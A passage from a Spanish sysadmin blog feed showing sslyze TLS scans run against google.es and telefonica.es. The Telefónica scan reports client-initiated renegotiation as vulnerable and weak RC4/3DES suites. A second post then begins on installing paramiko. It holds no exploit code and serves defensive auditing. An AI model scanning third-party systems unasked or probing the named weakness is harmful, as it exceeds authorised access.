Removing intermediate container 6ee35651756c
Step &lt;span class="m"&gt;4&lt;/span&gt; : CMD -h
 ---&amp;gt; Running in 2e53a6f5f90b
 ---&amp;gt; 8e493a176b44
Removing intermediate container 2e53a6f5f90b
Successfully built 8e493a176b44
gerard@marcopolo:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a lanzar dos veces el escaneo, contra dos conocidos dominios, solo para ver como funciona. El primero es el dominio español de &lt;a href="https://www.google.es/"&gt;Google&lt;/a&gt;. Este no presenta vulnerabilidades y su alta disponibilidad nos permite hacer pruebas de forma indiscriminada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@marcopolo:~$ docker run -ti --rm sslyze www.google.es



 AVAILABLE PLUGINS
 -----------------

  CertificateInfoPlugin
  SessionRenegotiationPlugin
  HttpHeadersPlugin
  OpenSslCcsInjectionPlugin
  OpenSslCipherSuitesPlugin
  FallbackScsvPlugin
  SessionResumptionPlugin
  CompressionPlugin
  HeartbleedPlugin



 CHECKING HOST&lt;span class="o"&gt;(&lt;/span&gt;S&lt;span class="o"&gt;)&lt;/span&gt; AVAILABILITY
 -----------------------------

   www.google.es:443                       &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;216&lt;/span&gt;.58.208.195 



 SCAN RESULTS FOR WWW.GOOGLE.ES:443 - &lt;span class="m"&gt;216&lt;/span&gt;.58.208.195:443
 -------------------------------------------------------

  * TLSV1_1 Cipher Suites:
      Preferred:                       
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
      Accepted:                        
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_128_CBC_SHA                      -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     -              &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 

  * TLSV1_2 Cipher Suites:
      Preferred:                       
        OLD_TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256   ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
      Accepted:                        
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        OLD_TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256   ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384             ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_256_CBC_SHA256                   -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_256_GCM_SHA384                   -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256             ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_128_CBC_SHA256                   -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_128_GCM_SHA256                   -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_128_CBC_SHA                      -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     -              &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 

  * Session Renegotiation:
      Client-initiated Renegotiation:    OK - Rejected
      Secure Renegotiation:              OK - Supported

  * Deflate Compression:
                                         OK - Compression disabled

  * Session Resumption:
      With Session IDs:                  OK - Supported &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt; successful, &lt;span class="m"&gt;0&lt;/span&gt; failed, &lt;span class="m"&gt;0&lt;/span&gt; errors, &lt;span class="m"&gt;5&lt;/span&gt; total attempts&lt;span class="o"&gt;)&lt;/span&gt;.
      With TLS Tickets:                  OK - Supported

  * SSLV3 Cipher Suites:
      Server rejected all cipher suites.

  * OpenSSL Heartbleed:
                                         OK - Not vulnerable to Heartbleed

  * OpenSSL CCS Injection:
                                         OK - Not vulnerable to OpenSSL CCS injection

  * SSLV2 Cipher Suites:
      Server rejected all cipher suites.

  * Downgrade Attacks:
      TLS_FALLBACK_SCSV:                 OK - Supported

  * TLSV1 Cipher Suites:
      Preferred:                       
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
      Accepted:                        
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_AES_128_CBC_SHA                      -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     -              &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;200&lt;/span&gt; OK                                                 

  * Certificate Basic Information:
      SHA1 Fingerprint:                  cdce30907e101061671f2c17c5e445c3dadf0d00
      Common Name:                       *.google.es
      Issuer:                            Google Internet Authority G2
      Serial Number:                     7B527383A3925A33
      Not Before:                        Nov &lt;span class="m"&gt;10&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:30:00 &lt;span class="m"&gt;2016&lt;/span&gt; GMT
      Not After:                         Feb  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:30:00 &lt;span class="m"&gt;2017&lt;/span&gt; GMT
      Signature Algorithm:               sha256WithRSAEncryption
      Public Key Algorithm:              rsaEncryption
      Key Size:                          &lt;span class="m"&gt;2048&lt;/span&gt;
      Exponent:                          &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x10001&lt;span class="o"&gt;)&lt;/span&gt;
      X509v3 Subject Alternative Name:   &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;DNS&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;*.google.es&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;google.es&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]}&lt;/span&gt;

  * Certificate - Trust:
      Hostname Validation:               OK - Subject Alternative Name matches www.google.es
      Mozilla NSS CA Store &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;09&lt;/span&gt;/2016&lt;span class="o"&gt;)&lt;/span&gt;:    OK - Certificate is trusted
      Microsoft CA Store &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;09&lt;/span&gt;/2016&lt;span class="o"&gt;)&lt;/span&gt;:      OK - Certificate is trusted
      Apple CA Store &lt;span class="o"&gt;(&lt;/span&gt;OS X &lt;span class="m"&gt;10&lt;/span&gt;.11.6&lt;span class="o"&gt;)&lt;/span&gt;:     OK - Certificate is trusted
      Java &lt;span class="m"&gt;7&lt;/span&gt; CA Store &lt;span class="o"&gt;(&lt;/span&gt;Update &lt;span class="m"&gt;79&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:       OK - Certificate is trusted
      AOSP CA Store &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.0.0 r1&lt;span class="o"&gt;)&lt;/span&gt;:          OK - Certificate is trusted
      Received Chain:                    *.google.es --&amp;gt; Google Internet Authority G2 --&amp;gt; GeoTrust Global CA
      Verified Chain w/ Mozilla Store:   *.google.es --&amp;gt; Google Internet Authority G2 --&amp;gt; GeoTrust Global CA
      Received Chain Contains Anchor:    OK - Anchor certificate not sent
      Received Chain Order:              OK - Order is valid
      Verified Chain contains SHA1:      OK - No SHA1-signed certificate in the verified certificate chain

  * Certificate - OCSP Stapling:
                                         NOT SUPPORTED - Server did not send back an OCSP response.



 SCAN COMPLETED IN &lt;span class="m"&gt;1&lt;/span&gt;.09 S
 ------------------------

gerard@marcopolo:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El segundo es un dominio vulnerable cualquiera. Para este ejemplo, vamos a usar la página web del proveedor de servicios de internet que me está dando conectividad, &lt;a href="https://www.telefonica.es/es/"&gt;Telefónica&lt;/a&gt;. No hay malas intenciones, así que si alguien se da por ofendido o atacado, pido disculpas con anterioridad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@marcopolo:~$ docker run -ti --rm sslyze www.telefonica.es



 AVAILABLE PLUGINS
 -----------------

  CertificateInfoPlugin
  SessionRenegotiationPlugin
  HttpHeadersPlugin
  OpenSslCcsInjectionPlugin
  OpenSslCipherSuitesPlugin
  FallbackScsvPlugin
  SessionResumptionPlugin
  CompressionPlugin
  HeartbleedPlugin



 CHECKING HOST&lt;span class="o"&gt;(&lt;/span&gt;S&lt;span class="o"&gt;)&lt;/span&gt; AVAILABILITY
 -----------------------------

   www.telefonica.es:443                       &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;212&lt;/span&gt;.170.36.79 



 SCAN RESULTS FOR WWW.TELEFONICA.ES:443 - &lt;span class="m"&gt;212&lt;/span&gt;.170.36.79:443
 ----------------------------------------------------------

  * TLSV1 Cipher Suites:
      Preferred:                       
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
      Accepted:                        
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_128_CBC_SHA                      -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_RC4_128_SHA                          -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               ECDH-256 bits  &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     -              &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              

  * TLSV1_1 Cipher Suites:
      Preferred:                       
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
      Accepted:                        
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_128_CBC_SHA                      -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_RC4_128_SHA                          -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               ECDH-256 bits  &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     -              &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              

  * TLSV1_2 Cipher Suites:
      Preferred:                       
        TLS_RSA_WITH_AES_256_CBC_SHA256                   -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
      Accepted:                        
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384             ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_256_CBC_SHA                      -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_256_CBC_SHA256                   -              &lt;span class="m"&gt;256&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256             ECDH-256 bits  &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_128_CBC_SHA256                   -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_AES_128_CBC_SHA                      -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_RC4_128_SHA                          -              &lt;span class="m"&gt;128&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               ECDH-256 bits  &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     -              &lt;span class="m"&gt;112&lt;/span&gt; bits      HTTP &lt;span class="m"&gt;302&lt;/span&gt; Found - https://www.telefonica.es/es/              

  * Session Renegotiation:
      Client-initiated Renegotiation:    VULNERABLE - Server honors client-initiated renegotiations
      Secure Renegotiation:              OK - Supported

  * Deflate Compression:
                                         OK - Compression disabled

  * OpenSSL Heartbleed:
                                         OK - Not vulnerable to Heartbleed

  * OpenSSL CCS Injection:
                                         OK - Not vulnerable to OpenSSL CCS injection

  * Session Resumption:
      With Session IDs:                  OK - Supported &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt; successful, &lt;span class="m"&gt;0&lt;/span&gt; failed, &lt;span class="m"&gt;0&lt;/span&gt; errors, &lt;span class="m"&gt;5&lt;/span&gt; total attempts&lt;span class="o"&gt;)&lt;/span&gt;.
      With TLS Tickets:                  NOT SUPPORTED - TLS ticket not assigned.

  * SSLV3 Cipher Suites:
      Server rejected all cipher suites.

  * Downgrade Attacks:
      TLS_FALLBACK_SCSV:                 OK - Supported

  * SSLV2 Cipher Suites:
      Server rejected all cipher suites.

  * Certificate Basic Information:
      SHA1 Fingerprint:                  4a22795afb0bee3d6c02530e5574a797031ab1d0
      Common Name:                       www.telefonica.es
      Issuer:                            GlobalSign Organization Validation CA - SHA256 - G2
      Serial Number:                     5865A61D377E8CD08D536C1B
      Not Before:                        Jul &lt;span class="m"&gt;11&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:36:02 &lt;span class="m"&gt;2016&lt;/span&gt; GMT
      Not After:                         Jul &lt;span class="m"&gt;12&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:36:02 &lt;span class="m"&gt;2018&lt;/span&gt; GMT
      Signature Algorithm:               sha256WithRSAEncryption
      Public Key Algorithm:              rsaEncryption
      Key Size:                          &lt;span class="m"&gt;2048&lt;/span&gt;
      Exponent:                          &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x10001&lt;span class="o"&gt;)&lt;/span&gt;
      X509v3 Subject Alternative Name:   &lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;DNS&amp;#39;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;www.telefonica.es&amp;#39;&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;telefonica.es&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]}&lt;/span&gt;

  * Certificate - Trust:
      Hostname Validation:               OK - Subject Alternative Name matches www.telefonica.es
      Mozilla NSS CA Store &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;09&lt;/span&gt;/2016&lt;span class="o"&gt;)&lt;/span&gt;:    OK - Certificate is trusted
      Microsoft CA Store &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;09&lt;/span&gt;/2016&lt;span class="o"&gt;)&lt;/span&gt;:      OK - Certificate is trusted
      Java &lt;span class="m"&gt;7&lt;/span&gt; CA Store &lt;span class="o"&gt;(&lt;/span&gt;Update &lt;span class="m"&gt;79&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;:       OK - Certificate is trusted
      Apple CA Store &lt;span class="o"&gt;(&lt;/span&gt;OS X &lt;span class="m"&gt;10&lt;/span&gt;.11.6&lt;span class="o"&gt;)&lt;/span&gt;:     OK - Certificate is trusted
      AOSP CA Store &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.0.0 r1&lt;span class="o"&gt;)&lt;/span&gt;:          OK - Certificate is trusted
      Received Chain:                    www.telefonica.es --&amp;gt; GlobalSign Organization Validation CA - SHA256 - G2
      Verified Chain w/ Mozilla Store:   www.telefonica.es --&amp;gt; GlobalSign Organization Validation CA - SHA256 - G2 --&amp;gt; GlobalSign
      Received Chain Contains Anchor:    OK - Anchor certificate not sent
      Received Chain Order:              OK - Order is valid
      Verified Chain contains SHA1:      OK - No SHA1-signed certificate in the verified certificate chain

  * Certificate - OCSP Stapling:
                                         NOT SUPPORTED - Server did not send back an OCSP response.



 SCAN COMPLETED IN &lt;span class="m"&gt;2&lt;/span&gt;.42 S
 ------------------------

gerard@marcopolo:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos con este escaneo que tienen una vulnerabilidad. La verdad es que no tengo ni ganas ni tiempo para explotarla, pero como suelo estar en el lado de los buenos, mi trabajo sería detectarla y corregirla. En ambos casos podréis encontrar amplia información con una rápida búsqueda por internet.&lt;/p&gt;
&lt;p&gt;Y con esto ya podemos anticiparnos a cualquier escaneo que nos puedan hacer a nuestros dominios, quedando como auténticos profesionales, y ahorrándonos burocracia en forma de comunicaciones con nuestro auditor.&lt;/p&gt;</content><category term="sslyze"></category><category term="python"></category><category term="pentest"></category></entry><entry><title>Usando SSH en nuestros scripts python mediante paramiko</title><link href="http://www.linuxsysadmin.ml/2017/01/usando-ssh-en-nuestros-scripts-python-mediante-paramiko.html" rel="alternate"></link><published>2017-01-23T10:00:00+01:00</published><updated>2017-01-23T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-01-23:/2017/01/usando-ssh-en-nuestros-scripts-python-mediante-paramiko.html</id><summary type="html">&lt;p&gt;Es muy útil lanzar comandos &lt;strong&gt;SSH&lt;/strong&gt; desde un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;bash&lt;/strong&gt;. Sin embargo, los &lt;em&gt;scripts&lt;/em&gt; en &lt;strong&gt;bash&lt;/strong&gt; se vuelve ilegibles rápidamente, y no nos ofrece el poderío de la librería &lt;strong&gt;python&lt;/strong&gt;. No es de extrañar que herramientas como &lt;strong&gt;ansible&lt;/strong&gt; o &lt;strong&gt;fabric&lt;/strong&gt; estén escritas en &lt;strong&gt;python&lt;/strong&gt;, usando una librería llamada &lt;strong&gt;paramiko …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Es muy útil lanzar comandos &lt;strong&gt;SSH&lt;/strong&gt; desde un &lt;em&gt;script&lt;/em&gt; de &lt;strong&gt;bash&lt;/strong&gt;. Sin embargo, los &lt;em&gt;scripts&lt;/em&gt; en &lt;strong&gt;bash&lt;/strong&gt; se vuelve ilegibles rápidamente, y no nos ofrece el poderío de la librería &lt;strong&gt;python&lt;/strong&gt;. No es de extrañar que herramientas como &lt;strong&gt;ansible&lt;/strong&gt; o &lt;strong&gt;fabric&lt;/strong&gt; estén escritas en &lt;strong&gt;python&lt;/strong&gt;, usando una librería llamada &lt;strong&gt;paramiko&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Una vez en el terreno de &lt;strong&gt;python&lt;/strong&gt;, disponemos de todas las opciones que tenemos habitualmente en el lenguaje, como por ejemplo, el módulo de expresiones regulares para &lt;em&gt;parsear&lt;/em&gt; la salida. Estos &lt;em&gt;scripts&lt;/em&gt; quedan muy pequeños, legibles y limpios.&lt;/p&gt;
&lt;p&gt;En este artículo vamos a explicar como instalar y usar &lt;strong&gt;paramiko&lt;/strong&gt;, con un ejemplo simple. El resto quedará a la imaginación de los lectores.&lt;/p&gt;
&lt;h2&gt;Instalando la librería en un virtualenv&lt;/h2&gt;
&lt;p&gt;Vamos a hacernos con el control de &lt;em&gt;root&lt;/em&gt;, de forma interactiva o mediante &lt;strong&gt;sudo&lt;/strong&gt; para instalar las herramientas básicas para utilizar &lt;em&gt;virtualenvs&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~# apt-get install python-virtualenv  
...
root@desktop:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como adelanto, el comando &lt;strong&gt;pip&lt;/strong&gt; se va a ir quejando porque no dispone de un compilador y de ciertas librerías para construir las librerías de las que &lt;strong&gt;paramiko&lt;/strong&gt; depende. Podéis ir instalando estas librerías a medida que las vaya pidiendo, o por comodidad, las instalamos ahora de golpe.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~# apt-get install gcc python-dev libssl-dev libffi-dev
...  
root@desktop:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya con las dependencias cumplidas, volvemos a utilizar un usuario sin privilegios, por seguridad. Vamos a crear un &lt;em&gt;virtualenv&lt;/em&gt; en una localización arbitraria.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~/ssl$ virtualenv env
Running virtualenv with interpreter /usr/bin/python2
New python executable in env/bin/python2
Also creating executable in env/bin/python
Installing setuptools, pip...done.
gerard@desktop:~/ssl$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Activamos el &lt;em&gt;virtualenv&lt;/em&gt;, para asegurar que la instalación de &lt;strong&gt;paramiko&lt;/strong&gt; se hace en el mismo, y así no ensuciamos el sistema con nuestras librerías propias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~/ssl$ . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt;gerard@desktop:~/ssl$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instalar la librería es tan fácil como utilizar &lt;strong&gt;pip&lt;/strong&gt; o &lt;strong&gt;easy_install&lt;/strong&gt; para instalarla. Como &lt;strong&gt;pip&lt;/strong&gt; es el futuro de las herramientas &lt;strong&gt;python&lt;/strong&gt;, vamos con este comando. Este se va a bajar todos los paquetes y va a construir las librerías auxiliares; es un proceso con mucha salida, pero tarda poco.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt;gerard@desktop:~/ssl$ pip install paramiko
...  
Successfully installed paramiko pyasn1 cryptography idna six setuptools enum34 ipaddress cffi pycparser
Cleaning up...
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt;gerard@desktop:~/ssl$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, solo queda hacer un script que satisfaga nuestras necesidades.&lt;/p&gt;
&lt;h2&gt;Un script de ejemplo&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que tenemos un servidor llamado &lt;em&gt;server&lt;/em&gt;, con un usuario &lt;em&gt;gerard&lt;/em&gt; con permiso para hacer &lt;strong&gt;sudo&lt;/strong&gt;. Vamos a lanzar tres comandos por &lt;strong&gt;SSH&lt;/strong&gt;, que nos van a indicar su &lt;em&gt;hostname&lt;/em&gt; y el usuario con el que ejecutamos los comandos, con y sin &lt;strong&gt;sudo&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Siguiendo &lt;a href="http://docs.paramiko.org/en/2.1/"&gt;la documentación&lt;/a&gt;, rápidamente sacamos un &lt;em&gt;script&lt;/em&gt; mínimo. Para poder reutilizarlo en futuras aventuras, vamos a separar la lógica de ejecutar un comando del resto, mediante una función.&lt;/p&gt;
